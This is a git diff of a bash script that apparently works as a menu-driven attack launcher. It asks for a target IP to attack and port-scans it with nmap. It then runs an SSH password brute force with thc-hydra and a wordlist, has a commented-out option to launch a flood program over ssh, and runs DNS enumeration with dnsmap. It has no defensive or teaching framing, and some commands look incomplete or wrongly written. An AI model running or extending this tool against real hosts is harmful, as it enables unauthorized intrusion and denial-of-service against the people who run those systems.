@@ -18,8 +18,8 @@ dnsprog="yourfilename"
 # END attack programs #
 
 # How are you going to flood the bitch #
-#viassh="$(ssh somename /usr/bin/perl $floodprog  $ip)"
-#floodprog="/somedir/somemoredir/floodthing"
+#floodprog="/some/dir/where/progis"
+#viassh="$(ssh somename  -c "/usr/bin/perl $floodprog  $ip")"
 
 # lists for password bruteforcing #
 #rainbowtbl="/somedir/someplace/somefile"
@@ -70,7 +70,7 @@ echo "Please be aware that web attacks differ greatly from network attacks"
 
 # IP attack  #
 
-      echo "Enter IP address.  You will be asked for hostname if the attack requires it"
+      echo "Enter IP address to attack.  You will be asked for hostname if the attack requires it"
         read ip 
         nmap -Pn $ip | grep open   # Get the ports from the ip  #
 
@@ -80,7 +80,7 @@ read -r -p " Choose a port to attack " portresponse
   case "$portresponse" in 
      22)  # If you type 22 Do this attack else do another attack 
   	echo "Time for an ssh bruteforce"
-		thc-hydra 	
+		thc-hydra -w $wordlist $ip -p 22
   ;;
       flood)
 	echo " Flood the bitch " 
@@ -96,6 +96,6 @@ read -r -p " Choose a port to attack " portresponse
 			dnsmap $web
   ;;
 	*)
-		echo " Either no attack for selected port, or something went wrong"
+		echo " Either no attack for selected port, or something went wrong "
 ;;
 esac
